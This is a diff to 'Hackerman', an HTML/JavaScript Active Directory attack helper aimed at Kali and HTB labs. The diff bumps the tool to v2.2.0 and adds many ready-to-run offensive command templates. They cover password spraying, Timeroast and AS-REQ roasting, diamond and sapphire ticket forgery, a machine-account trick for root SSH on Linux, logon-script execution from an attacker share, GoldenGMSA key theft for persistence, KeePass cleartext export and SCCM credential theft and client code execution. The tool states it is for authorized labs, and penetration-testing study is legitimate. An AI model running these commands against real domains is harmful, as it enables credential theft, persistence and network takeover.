@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Hackerman v2.0.0 — AD Attack Helper (Kali · HTB)</title>
+<title>Hackerman v2.2.0 — AD Attack Helper (Kali · HTB)</title>
 <style>
 :root{
   --bg:#0a0f1a; --panel:#0f1729; --panel2:#131d33; --line:#1e2b45;
@@ -285,7 +285,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
 
 <header>
   <div class="hwrap">
-    <div class="brand">Hackerman <b>v2.0.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
+    <div class="brand">Hackerman <b>v2.2.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
     <div class="hactions">
       <select id="presetSel" title="Load preset"><option value="">— presets —</option></select>
       <button id="presetSave" title="Save current context as preset">Save</button>
@@ -343,7 +343,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
   <section id="tab-legend" class="tab"></section>
 </main>
 
-<footer class="mono">Hackerman v2.0.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
+<footer class="mono">Hackerman v2.2.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
 
 <div id="focusOverlay" class="hidden">
   <div id="focusBox" role="dialog" aria-modal="true" tabindex="-1" aria-label="recipe focus">
@@ -1701,9 +1701,9 @@ function renderLegend(){
   const tab = $('#tab-legend');
   tab.innerHTML = '';
   const about = document.createElement('div');
-  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v2.0.0</h2>' +
+  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v2.2.0</h2>' +
     '<p class="dim">Single-file Active Directory attack helper for Kali, built by <b>@bongoalex</b> with <b>deepseek</b>. ' +
-    RECIPES.length + ' recipes · ' + FLOWS.length + ' wizard flows · ' + CYPHER.length + ' BloodHound queries · 126 <b>flashcards</b> (separate page, header button). Offline, no dependencies, no telemetry.</p>' +
+    RECIPES.length + ' recipes · ' + FLOWS.length + ' wizard flows · ' + CYPHER.length + ' BloodHound queries · 135 <b>flashcards</b> (separate page, header button). Offline, no dependencies, no telemetry.</p>' +
     '<p class="dim">Context fields run <b>plausibility checks</b> (⚠ badge, tooltip; warn-only) and recipe commands support <b>conditional blocks</b> (<span class="mono">{{#if var}}…{{/if}}</span>) — the Kerberos setup conf covers the trust realm automatically.</p>' +
     '<p class="dim">Use only for authorized testing (HTB labs, your own infrastructure, signed engagements). Syntax is version-sensitive — cross-check against your target versions.</p>';
   tab.appendChild(about);
@@ -2078,8 +2078,9 @@ cmds:[
  [`nxc winrm {{target_host}} -u '{{user}}' -H '{{nthash}}'`,'WinRM — via PtH'],
  [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --local-auth`,'local account check'],
  [`nxc smb {{target_host}} -u '{{user}}' -H '{{nthash}}' --local-auth`,'local account check — via PtH'],
-  [`nxc mssql {{target_host}} -u '{{user}}' -p '{{password}}' -d {{netbios}}`,'MSSQL'],
-  [`nxc mssql {{target_host}} -u '{{user}}' -H '{{nthash}}' -d {{netbios}}`,'MSSQL — via PtH']
+   [`nxc mssql {{target_host}} -u '{{user}}' -p '{{password}}' -d {{netbios}}`,'MSSQL'],
+   [`nxc mssql {{target_host}} -u '{{user}}' -H '{{nthash}}' -d {{netbios}}`,'MSSQL — via PtH'],
+  [`runas /netonly /user:{{domain}}\\{{user}} powershell.exe`,'Windows: use creds for remote auth only (interactive logon)','n']
 ],note:'<b>Pwn3d!</b> in nxc output = local admin (or DA on DC). Add <span class="mono">-d {{domain}}</span> whenever the short name is ambiguous. LDAP: <span class="mono">--port 636</span> switches to LDAPS, which is also the automatic fallback when the DC enforces signing. Every command has a <b>via PtH</b> pendant for the NT-hash case — the <b>Pass-the-Hash auth checks</b> card has the same checks with machine-account notes.'});
 
 R({id:'pth-check',cat:'recon',title:'Pass-the-Hash auth checks',desc:'NTLM hash instead of a password — no cracking needed.',
@@ -2155,8 +2156,11 @@ cmds:[
  [`nxc smb {{dc_ip}} -u users.txt -p 'Spring2026!' --continue-on-success`,'SMB spray'],
  [`nxc ldap {{dc_ip}} -u users.txt -p 'Spring2026!' --continue-on-success`,'LDAP spray'],
  [`nxc winrm {{target_ip}} -u users.txt -p 'Spring2026!' --continue-on-success`,'WinRM spray'],
-  [`nxc smb {{dc_ip}} -u users.txt -p 'Spring2026!' --continue-on-success -d {{netbios}}`,'explicit domain']
-],note:'<span class="mono">--continue-on-success</span> keeps going after a hit. Respect the lockout counter: threshold 5 means max 3 attempts per window. Common lab patterns: <span class="mono">Season+Year</span>, <span class="mono">Company+123</span>, username as password.'});
+   [`nxc smb {{dc_ip}} -u users.txt -p 'Spring2026!' --continue-on-success -d {{netbios}}`,'explicit domain'],
+  [`nxc smb {{dc_ip}} -u users.txt -p users.txt --no-bruteforce --continue-on-success`,'user-as-password pairs (line-by-line)'],
+  [`LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{domain_dn}}' '(&(userAccountControl=4128)(logonCount=0))' sAMAccountName`,'pre-created computers (password = lowercase name)'],
+  [`nxc smb {{dc_ip}} -u computers.txt -p passwords.txt --no-bruteforce`,'try pre-2k names (hit = STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT)']
+ ],note:'<span class="mono">--continue-on-success</span> keeps going after a hit. Respect the lockout counter: threshold 5 means max 3 attempts per window. Common lab patterns: <span class="mono">Season+Year</span>, <span class="mono">Company+123</span>, username as password. Default-creds lists (SecLists) and situational patterns (company/city/l33t, username-anarchy for name lists) belong here too — spray, do not bruteforce.'});
 
 R({id:'session-hunt',cat:'recon',title:'Session hunting — where are the admins?',desc:'Find logged-on users and active sessions to pick your lateral movement target.',
 cmds:[
@@ -2391,8 +2395,11 @@ cmds:[
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --kerberoasting {{hashfile}}`,'nxc kerberoasting'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -H '{{nthash}}' --kerberoasting {{hashfile}}`,'nxc kerberoasting — via PtH'],
  [`KRB5CCNAME={{ccache}} nxc ldap {{dc_host}} -u '{{user}}' -k --use-kcache --kerberoasting {{hashfile}}`,'nxc via ccache'],
- [`hashcat -m 13100 {{hashfile}} {{wordlist}}`,'crack (no proxy)','n']
-],note:'Anything with an SPN counts, including machine accounts and the krbtgt-adjacent service accounts. Hashes start with <span class="mono">$krb5tgs$23$</span>.'});
+  [`hashcat -m 13100 {{hashfile}} {{wordlist}}`,'crack (no proxy)','n'],
+  [`pip install timeroast-ng`,'install Timeroast','n'],
+  [`python3 timeroast-ng.py -r1000-2000 -T5 {{dc_ip}}`,'unauthenticated NTP roast → hashcat -m 31300 --username'],
+  [`Rubeus.exe kerberoast /spn:'{{spn}}' /nopreauth:'{{user}}' /domain:{{domain}} /dc:{{dc_host}} /nowrap /outfile:hashes.asreq`,'AS-REQ roast, no creds (4768 instead of 4769)','n']
+ ],note:'Anything with an SPN counts, including machine accounts and the krbtgt-adjacent service accounts. Hashes start with <span class="mono">$krb5tgs$23$</span>. <b>Timeroast</b> (bvcyber/Timeroast, Tom Tervoort) abuses MS-SNTP auth for computer/trust accounts — unauthenticated; the same whitepaper adds computer-spraying and trustroasting variants.'});
 
 R({id:'targeted-kerberoast',cat:'krb',title:'Targeted kerberoast (write SPN on a user)',desc:'No roastable SPN? Give a user you can write to one, roast, clean up.',
 cmds:[
@@ -2443,8 +2450,10 @@ cmds:[
  [`impacket-ticketer -aesKey '{{aeskey}}' -domain-sid '{{domain_sid}}' -domain {{domain}} '{{target_user}}'`,'forge golden (AES256 — preferred, works in AES-only domains)'],
  [`impacket-ticketer -nthash '{{krbtgt_hash}}' -domain-sid '{{domain_sid}}' -domain {{domain}} '{{target_user}}'`,'RC4 fallback (only when you have no AES key for krbtgt)'],
  [`export KRB5CCNAME=$(pwd)/'{{target_user}}.ccache' && nxc smb {{dc_host}} -u '{{target_user}}' -k --use-kcache --ntds`,'use it to DCSync'],
- [`KRB5CCNAME={{ccache}} impacket-lookupsid '{{domain}}/{{target_user}}'@{{dc_host}} -k -no-pass`,'verify ticket works']
-],note:'Golden tickets survive password changes of the impersonated user — only a double krbtgt reset kills them (lab: single reset fine). Domain SID: see context, e.g. <span class="mono">S-1-5-21-…</span>.'});
+  [`KRB5CCNAME={{ccache}} impacket-lookupsid '{{domain}}/{{target_user}}'@{{dc_host}} -k -no-pass`,'verify ticket works'],
+  [`Rubeus.exe diamond /krbkey:{{krbtgt_hash}} /tgtdeleg /ticketuser:{{target_user}} /ticketuserid:<RID> /groups:512 /ptt`,'diamond: modify legit TGT, resign (stealthier PAC)','n'],
+  [`impacket-ticketer -request -impersonate '<ADMIN>' -domain {{domain}} -user '{{user}}' -password '{{password}}' -nthash '{{krbtgt_hash}}' -user-id {{user_rid}} -domain-sid {{domain_sid}} '{{target_user}}'`,'sapphire: legit PAC via S4U2self+u2u (groups/extra-sid ignored)']
+ ],note:'Golden tickets survive password changes of the impersonated user — only a double krbtgt reset kills them (lab: single reset fine). Domain SID: see context, e.g. <span class="mono">S-1-5-21-…</span>. <b>Diamond</b> needs a legit TGT + the krbtgt key and re-signs a modified PAC (impacket ticketer <span class="mono">-request</span> fully replaces the PAC — louder). <b>Sapphire</b> grafts a privileged PAC obtained via S4U2self+u2u; post-KB5008380 it can fail with <span class="mono">KDC_ERR_TGT_REVOKED</span> (missing Requestor/Attributes). krbtgt-free persistence alternative: RBCD onto krbtgt (Wagging-the-Dog) → on-demand TGTs.'});
 
 R({id:'silver-ticket',cat:'krb',title:'Silver ticket (service hash)',desc:'Forge a TGS for one service when you have that machine/service account hash.',
 cmds:[
@@ -2454,7 +2463,15 @@ cmds:[
  [`impacket-ticketer -nthash '{{nthash}}' -domain-sid '{{domain_sid}}' -domain {{domain}} -spn cifs/{{target_fqdn}} '{{target_user}}'`,'RC4 fallback (only without the AES key)'],
  [`export KRB5CCNAME=$(pwd)/'{{target_user}}.ccache' && nxc smb {{target_host}} -u '{{target_user}}' -k --use-kcache`,'use it'],
  [`impacket-ticketer -nthash '{{nthash}}' -domain-sid '{{domain_sid}}' -domain {{domain}} -spn HOST/{{target_fqdn}} '{{target_user}}'`,'HOST variant (for psexec)']
-],note:'Silver tickets bypass the DC entirely — no traffic to validate, no golden ticket needed. SPN must match exactly what the service runs as.'});
+ ],note:'Silver tickets bypass the DC entirely — no traffic to validate, no golden ticket needed. SPN must match exactly what the service runs as.'});
+
+R({id:'dollar-ticket',cat:'krb',title:'Dollar ticket — machine account root$ → Linux root',desc:'MAQ + MIT Kerberos mapping: a machine account named after a local admin maps to that admin on Linux SSH/GSSAPI.',
+cmds:[
+ [`impacket-addcomputer -method SAMR -computer-name 'root' -computer-pass '{{computer_pass}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'create machine account root$ (MAQ)'],
+ [`impacket-getTGT '{{domain}}/root$:{{computer_pass}}' -dc-ip {{dc_ip}}`,'TGT for root$ (KDC resolves root → root$)'],
+ [`export KRB5CCNAME=root.ccache && ssh -o PreferredAuthentications=gssapi-with-mic -l root {{target_host}}`,'SSH as root — MIT strips the $','n'],
+ [`impacket-addcomputer -method SAMR -computer-name 'root' -computer-pass '{{computer_pass}}' -delete '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'CLEANUP: delete the machine account']
+],note:'Needs MachineAccountQuota > 0, a Linux target joined via SSSD/realm with default MIT mapping, GSSAPI SSH and no strict PAC validation. Password must meet the domain policy. Works for any local name (admin$, ...). Related CVEs: CVE-2020-25717 (Samba); KDC bamboozling fixed by KB5008380.'});
 
 R({id:'ticket-inspect',cat:'krb',title:'Inspect & renew Kerberos tickets',desc:'Decode a ccache, check service names/enctypes, and renew a TGT before it expires.',
 cmds:[
@@ -2514,7 +2531,7 @@ cmds:[
  [`nxc smb {{dc_host}} -u '{{user}}' -H '{{nthash}}' -M add-computer -o NAME='{{computer_name}}' PASSWORD='{{computer_pass}}'`,'nxc module add-computer (SAMR/LDAP; cleanup: add DELETE=True) — via PtH'],
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add computer '{{computer_name}}' '{{computer_pass}}'`,'bloodyAD alternative (no $ in name)'],
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p ':{{nthash}}' add computer '{{computer_name}}' '{{computer_pass}}'`,'bloodyAD alternative (no $ in name) — via PtH']
-],note:'Successful output: <span class="mono">[*] Successfully added machine account {{computer_name}} with password {{computer_pass}}.</span> If MAQ is 0 and you lack rights: relay NTLM to LDAP and use <span class="mono">ntlmrelayx --delegate-access</span> instead. Cleanup at the end: <span class="mono">impacket-addcomputer ... -delete</span>, nxc <span class="mono">-M add-computer -o NAME=... DELETE=True</span> or bloodyAD <span class="mono">remove computer</span>.'});
+ ],note:'Successful output: <span class="mono">[*] Successfully added machine account {{computer_name}} with password {{computer_pass}}.</span> If MAQ is 0 and you lack rights: relay NTLM to LDAP and use <span class="mono">ntlmrelayx --delegate-access</span> instead. Cleanup at the end: <span class="mono">impacket-addcomputer ... -delete</span>, nxc <span class="mono">-M add-computer -o NAME=... DELETE=True</span> or bloodyAD <span class="mono">remove computer</span>. Same MAQ primitive also enables pre-created-computer takeover (pw-spray card) and the sAMAccountName-spoofing chain (noPac card).'});
 
 R({id:'rbcd-write',cat:'deleg',title:'RBCD step 3 — grant delegation from rogue machine',desc:'Point the target computer at your rogue machine account.',
 cmds:[
@@ -2860,9 +2877,11 @@ cmds:[
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p ':{{nthash}}' set password '{{target_user}}' 'Pwn3d123!'`,'option C: reset password (loud) — via PtH'],
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{target_user}}'`,'option D: add to high-value group'],
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p ':{{nthash}}' add groupMember '{{group}}' '{{target_user}}'`,'option D: add to high-value group — via PtH'],
- [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add genericAll '{{target_user}}' '{{user}}'`,'grant yourself (if you have WriteDacl)'],
- [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p ':{{nthash}}' add genericAll '{{target_user}}' '{{user}}'`,'grant yourself (if you have WriteDacl) — via PtH']
-],note:'Shadow credentials (addKeyCredentialLink) is usually the cleanest: it yields a TGT + NT hash via PKINIT without touching the password.'});
+  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add genericAll '{{target_user}}' '{{user}}'`,'grant yourself (if you have WriteDacl)'],
+  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p ':{{nthash}}' add genericAll '{{target_user}}' '{{user}}'`,'grant yourself (if you have WriteDacl) — via PtH'],
+  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' set object '{{target_user}}' scriptPath -v '\\\\{{attacker_ip}}\\share\\file.exe'`,'option E: logon script → exec at next logon'],
+  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p ':{{nthash}}' set object '{{target_user}}' scriptPath -v '\\\\{{attacker_ip}}\\share\\file.exe'`,'option E: logon script — via PtH']
+ ],note:'Shadow credentials (addKeyCredentialLink) is usually the cleanest: it yields a TGT + NT hash via PKINIT without touching the password.'});
 
 R({id:'dacl-genericall-computer',cat:'dacl',title:'GenericAll / WriteAccountRestrictions on computer',desc:'Full control over a machine — shadow credentials or RBCD.',
 cmds:[
@@ -2949,7 +2968,7 @@ cmds:[
   [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' -M shadow-creds -o TARGET='{{target_user}}' ACTION=clear`,'CLEANUP (nxc): remove all key credentials'],
   [`certipy shadow clear -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -account '{{target_user}}'`,'CLEANUP: remove key credential'],
  [`certipy shadow clear -u '{{user}}@{{domain}}' -hashes ':{{nthash}}' -dc-ip {{dc_ip}} -account '{{target_user}}'`,'CLEANUP: remove key credential — with NT hash']
- ],note:'Requires the DC to run Windows Server 2016+ and AD CS or a CA available for PKINIT. <b>nxc module actions:</b> <span class="mono">list</span> (inventory), <span class="mono">add</span> (drops a PFX into <span class="mono">~/.nxc/modules/shadow-creds</span> — authenticate it with <span class="mono">certipy auth -pfx</span>), <span class="mono">info/remove</span> via <span class="mono">DEVICE_ID=…</span>, <span class="mono">clear</span> (cleanup). BloodHound edge: <span class="mono">AddKeyCredentialLink</span>. Windows equivalent: Rubeus <span class="mono">shadow /certify</span>.'});
+ ],note:'Requires the DC to run Windows Server 2016+ and AD CS or a CA available for PKINIT. <b>nxc module actions:</b> <span class="mono">list</span> (inventory), <span class="mono">add</span> (drops a PFX into <span class="mono">~/.nxc/modules/shadow-creds</span> — authenticate it with <span class="mono">certipy auth -pfx</span>), <span class="mono">info/remove</span> via <span class="mono">DEVICE_ID=…</span>, <span class="mono">clear</span> (cleanup). The returned NT hash comes from U2U (UnPAC-the-hash) — certipy auto does it for you; the manual path is PKINITtools <span class="mono">gettgtpkinit.py</span> + <span class="mono">getnthash.py</span>. BloodHound edge: <span class="mono">AddKeyCredentialLink</span>. Windows equivalent: Rubeus <span class="mono">shadow /certify</span>.'});
 
 R({id:'dacl-adminsdholder',cat:'dacl',title:'AdminSDHolder takeover → protected groups',desc:'Write an ACE on AdminSDHolder; SDProp copies it onto every protected account (Domain Admins, Enterprise Admins, ...).',
 cmds:[
@@ -3020,8 +3039,13 @@ cmds:[
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p ':{{nthash}}' get object 'gmsaAccount$' --attr msDS-ManagedPassword`,'bloodyAD gMSA read — via PtH'],
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr msLAPS-Password,ms-Mcs-AdmPwd`,'legacy + Windows LAPS v2 password'],
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p ':{{nthash}}' get object '{{target_host}}$' --attr msLAPS-Password,ms-Mcs-AdmPwd`,'legacy + Windows LAPS v2 password — via PtH'],
- [`nxc smb {{target_host}} -u '{{target_user}}' -p '<LAPS password>' --local-auth`,'use the LAPS password']
-],note:'Windows LAPS (2023+) uses <span class="mono">msLAPS-Password</span> instead of <span class="mono">ms-Mcs-AdmPwd</span>. gMSA read rights are granted per-account (<span class="mono">PrincipalsAllowedToRetrieveManagedPassword</span>).'});
+  [`nxc smb {{target_host}} -u '{{target_user}}' -p '<LAPS password>' --local-auth`,'use the LAPS password'],
+  [`git clone https://github.com/Semperis/GoldenGMSA`,'get GoldenGMSA (C#, build once)','n'],
+  [`GoldenGMSA.exe kdsinfo`,'dump KDS root keys (DA/EA or SYSTEM on DC)','n'],
+  [`GoldenGMSA.exe kdsinfo --forest {{domain}}`,'KDS keys of a specific domain (SYSTEM on its DC)','n'],
+  [`GoldenGMSA.exe gmsainfo --sid '<GMSA_SID>'`,'account data for password calc (low-priv AD read)','n'],
+  [`GoldenGMSA.exe compute --sid '<GMSA_SID>' --kdskey '<KDSKEY>' --pwdid '<PWDID>'`,'base64 password → MD4 = NT hash → PtH','n']
+ ],note:'Windows LAPS (2023+) uses <span class="mono">msLAPS-Password</span> instead of <span class="mono">ms-Mcs-AdmPwd</span>. gMSA read rights are granted per-account (<span class="mono">PrincipalsAllowedToRetrieveManagedPassword</span>). <b>GoldenGMSA persistence:</b> KDS root keys rarely rotate — exfiltrate once, compute any gMSA password later with low-priv reads (pyGoldenGMSA is the Python alternative).'});
 
 R({id:'creds-ntds-offline',cat:'creds',title:'Offline ntds.dit / SAM extraction',desc:'Got the files (backup, shadow copy, loot)? Parse them locally.',
 cmds:[
@@ -3061,8 +3085,12 @@ cmds:[
  [`nxc smb {{target_host}} -u '{{user}}' -H '{{nthash}}' -M spider_plus`,'spider shares for configs/scripts — via PtH'],
  [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -M gpp_password`,'GPP cpassword in SYSVOL'],
  [`nxc smb {{dc_host}} -u '{{user}}' -H '{{nthash}}' -M gpp_password`,'GPP cpassword in SYSVOL — via PtH'],
- [`runas /savecred /user:{{domain}}\\{{target_user}} cmd.exe`,'use saved creds (target-side)','n']
-],note:'<span class="mono">cmdkey /list</span> + <span class="mono">runas /savecred</span> is a classic combo. AutoLogon stores <span class="mono">DefaultPassword</span> in cleartext. Also check backup scripts, <span class="mono">web.config</span>, <span class="mono">*.ps1</span> on shares (spider_plus loot).'});
+  [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M keepass_discover`,'find KeePass processes/files'],
+  [`nxc smb {{target_host}} -u '{{user}}' -H '{{nthash}}' -M keepass_discover`,'find KeePass processes/files — via PtH'],
+  [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH='<CONFIG_PATH>'`,'trigger → cleartext DB export (waits for unlock)'],
+  [`nxc smb {{target_host}} -u '{{user}}' -H '{{nthash}}' -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH='<CONFIG_PATH>'`,'trigger → cleartext DB export — via PtH'],
+  [`runas /savecred /user:{{domain}}\\{{target_user}} cmd.exe`,'use saved creds (target-side)','n']
+ ],note:'<span class="mono">cmdkey /list</span> + <span class="mono">runas /savecred</span> is a classic combo. AutoLogon stores <span class="mono">DefaultPassword</span> in cleartext. Also check backup scripts, <span class="mono">web.config</span>, <span class="mono">*.ps1</span> on shares (spider_plus loot). KeePass needs local admin + a running, unlocked client (POLL waits for the master password); CLEAN removes trigger + export.'});
 
 R({id:'sebackup',cat:'creds',title:'SeBackupPrivilege — copy hives and ntds.dit',desc:'Backup Operators (or an enabled SeBackupPrivilege) can read any file — dump SAM/SYSTEM/SECURITY and even ntds.dit.',
 cmds:[
@@ -3363,7 +3391,7 @@ cmds:[
  [`python3 noPac.py {{domain}}/{{user}}:{{password}} -dc-ip {{dc_ip}} --impersonate '{{target_user}}' -dump`,'exploit + DCSync in one'],
  [`python3 noPac.py {{domain}}/{{user}} -hashes ':{{nthash}}' -dc-ip {{dc_ip}} --impersonate '{{target_user}}' -dump`,'exploit + DCSync in one — with NT hash'],
  [`ls -la *.ccache && export KRB5CCNAME=$(pwd)/{{target_user}}.ccache`,'use the returned ticket']
-],note:'<b>Lab only.</b> Patched since Nov 2021 (KB5008602) but still found on older HTB boxes. The scan is safe; the exploit creates and deletes a machine account (loud) and needs <span class="mono">MachineAccountQuota</span> > 0 or an existing machine account. Alternative: <span class="mono">-shell</span> for a psexec session.'});
+ ],note:'<b>Lab only.</b> Patched since Nov 2021 (KB5008602) but still found on older HTB boxes. The scan is safe; the exploit creates and deletes a machine account (loud) and needs <span class="mono">MachineAccountQuota</span> > 0 or an existing machine account. Alternative: <span class="mono">-shell</span> for a psexec session. Manual impacket chain (same bugs): addcomputer → clear SPNs → renameMachine to the DC name → getTGT → rename back → getST -self -impersonate → secretsdump; noPac.py just automates it.'});
 
 R({id:'cve-printnightmare',cat:'post',title:'CVE-2021-1675 PrintNightmare (legacy)',desc:'Spooler + Point-and-Print driver load: execute a DLL as SYSTEM on a vulnerable host.',
 cmds:[
@@ -3385,16 +3413,24 @@ cmds:[
   [`python3 sccmhunter.py find -u '{{user}}' -p '{{password}}' -d {{domain}} -dc-ip {{dc_ip}}`,'LDAP discovery (MP, PXE, site systems)'],
   [`python3 sccmhunter.py find -u '{{user}}' -hashes ':{{nthash}}' -d {{domain}} -dc-ip {{dc_ip}}`,'LDAP discovery (MP, PXE, site systems) — with NT hash'],
   [`python3 sccmhunter.py show -siteservers`,'list discovered site servers'],
+  [`python3 sccmhunter.py show -mps -users -computers -groups -creds -all`,'all recon tables'],
+  [`python3 sccmhunter.py show -all -json -csv`,'export recon (json/csv)'],
   [`python3 sccmhunter.py smb -u '{{user}}' -p '{{password}}' -d {{domain}} -dc-ip {{dc_ip}}`,'SMB signing / relay candidates'],
   [`python3 sccmhunter.py smb -u '{{user}}' -hashes ':{{nthash}}' -d {{domain}} -dc-ip {{dc_ip}}`,'SMB signing / relay candidates — with NT hash'],
   [`python3 sccmhunter.py http -u '{{user}}' -p '{{password}}' -d {{domain}} -dc-ip {{dc_ip}} -auto`,'client enrollment → NAA creds'],
   [`python3 sccmhunter.py http -u '{{user}}' -hashes ':{{nthash}}' -d {{domain}} -dc-ip {{dc_ip}} -auto`,'client enrollment → NAA creds — with NT hash'],
+  [`python3 sccmhunter.py http -u '{{user}}' -p '{{password}}' -d {{domain}} -dc-ip {{dc_ip}} -cn 'MACHINE$' -cp '<PASS>'`,'manual enrollment with owned machine'],
+  [`python3 sccmhunter.py http -u '{{user}}' -hashes ':{{nthash}}' -d {{domain}} -dc-ip {{dc_ip}} -cn 'MACHINE$' -cp '<PASS>'`,'manual enrollment with owned machine — with NT hash'],
+  [`python3 sccmhunter.py http -u '{{user}}' -p '{{password}}' -d {{domain}} -dc-ip {{dc_ip}} -mp <MP> -uuid <UUID>`,'retry policy request (from a previous registration)'],
+  [`python3 sccmhunter.py http -u '{{user}}' -hashes ':{{nthash}}' -d {{domain}} -dc-ip {{dc_ip}} -mp <MP> -uuid <UUID>`,'retry policy request — with NT hash'],
   [`python3 sccmhunter.py mssql -u '{{user}}' -p '{{password}}' -d {{domain}} -dc-ip {{dc_ip}} -tu '{{user}}' -sc <SITECODE> -stacked`,'generate takeover-1 SQL query (replace <SITECODE>)'],
   [`python3 sccmhunter.py mssql -u '{{user}}' -hashes ':{{nthash}}' -d {{domain}} -dc-ip {{dc_ip}} -tu '{{user}}' -sc <SITECODE> -stacked`,'generate takeover-1 SQL query (replace <SITECODE>) — with NT hash'],
   [`impacket-ntlmrelayx --smb2support -t mssql://{{target_ip}} -q '<QUERY_FROM_ABOVE>'`,'relay site server → DB admin (replace query; --socks-port for SOCKS)','n'],
   [`python3 sccmhunter.py dpapi -d {{domain}} -u '{{user}}' -p '{{password}}' -target <PXE_DP> -method disk`,'extract NAA secrets (replace <PXE_DP>)'],
-  [`python3 sccmhunter.py dpapi -d {{domain}} -u '{{user}}' -hashes ':{{nthash}}' -target <PXE_DP> -method disk`,'extract NAA secrets (replace <PXE_DP>) — with NT hash']
- ],note:'Signing-less site systems + coercion = database takeover. Alternatives: <span class="mono">SharpSCCM.exe</span> (Windows), <span class="mono">sccmsqlclient</span> for direct DB work. Client Push accounts and Network Access Accounts (NAA) are the high-value secrets. Add <span class="mono">-ldaps</span>/<span class="mono">-resolve</span> when needed.'});
+  [`python3 sccmhunter.py dpapi -d {{domain}} -u '{{user}}' -hashes ':{{nthash}}' -target <PXE_DP> -method disk`,'extract NAA secrets (replace <PXE_DP>) — with NT hash'],
+  [`python3 sccmhunter.py admin -u '{{user}}' -p '{{password}}' -ip {{target_ip}}`,'AdminService console (get_creds/decrypt/speak_to_the_manager/script)'],
+  [`python3 sccmhunter.py admin -u '{{user}}' -p ':{{nthash}}' -ip {{target_ip}}`,'AdminService console — with NT hash']
+  ],note:'Signing-less site systems + coercion = database takeover. Alternatives: <span class="mono">SharpSCCM.exe</span> (Windows), <span class="mono">sccmsqlclient</span> for direct DB work. Client Push accounts and Network Access Accounts (NAA) are the high-value secrets. Add <span class="mono">-ldaps</span>/<span class="mono">-resolve</span> when needed. AdminService console highlights: <span class="mono">get_creds</span> → <span class="mono">decrypt</span>, <span class="mono">speak_to_the_manager</span> (NAA + task sequences), <span class="mono">script</span> (RCE on clients), <span class="mono">show_admins</span>/<span class="mono">add_admin</span>; NTLM blocked there in v2509+. Coercion angle: force the SCCM server to auth (PetitPotam/coercer) and relay to its MSSQL (see mssql-coerce).'});
 
 R({id:'uac-bypass',cat:'post',title:'UAC bypass (fodhelper / eventvwr / computerdefaults)',desc:'From a medium-integrity shell: auto-elevating Windows binaries read HKCU keys you can write.',
 cmds:[
@@ -3496,7 +3532,44 @@ cmds:[
  [`echo '<HEX_DKM_KEY>' | xxd -r -p > /tmp/DkmKey.bin`,'convert the DKM key'],
  [`python3 ADFSpoof/ADFSpoof.py -b /tmp/EncryptedPfx.bin /tmp/DkmKey.bin dump --path /tmp/adfs_signing.pfx`,'decrypt the signing certificate'],
  [`python3 ADFSpoof/ADFSpoof.py -b /tmp/EncryptedPfx.bin /tmp/DkmKey.bin -s '{{target_fqdn}}' saml2 --endpoint 'https://{{target_fqdn}}/adfs/ls/IdpInitiatedSignOn.aspx' --nameidformat urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress --nameid '{{target_user}}@{{domain}}' --rpidentifier '<RP_IDENTIFIER>' --assertions '<CLAIMS>'`,'forge a SAML token for the relying party']
-],note:'Run ADFSDump as the ADFS service account (or pass <span class="mono">/user: /password: /domain: /server:</span>); it is a C# tool, so build it once with Visual Studio (or use a prebuilt release). The encrypted token-signing certificate and DKM key come from the ADFS configuration database (WID pipe). Forged tokens survive password changes, bypass MFA and stay valid until the token-signing certificate is rotated — try every DKM key if there are several master keys. Office 365 target: <span class="mono">o365 --upn user@domain --objectguid &lt;GUID&gt;</span>.'});
+ ],note:'Run ADFSDump as the ADFS service account (or pass <span class="mono">/user: /password: /domain: /server:</span>); it is a C# tool, so build it once with Visual Studio (or use a prebuilt release). The encrypted token-signing certificate and DKM key come from the ADFS configuration database (WID pipe). Forged tokens survive password changes, bypass MFA and stay valid until the token-signing certificate is rotated — try every DKM key if there are several master keys. Office 365 target: <span class="mono">o365 --upn user@domain --objectguid &lt;GUID&gt;</span>.'});
+
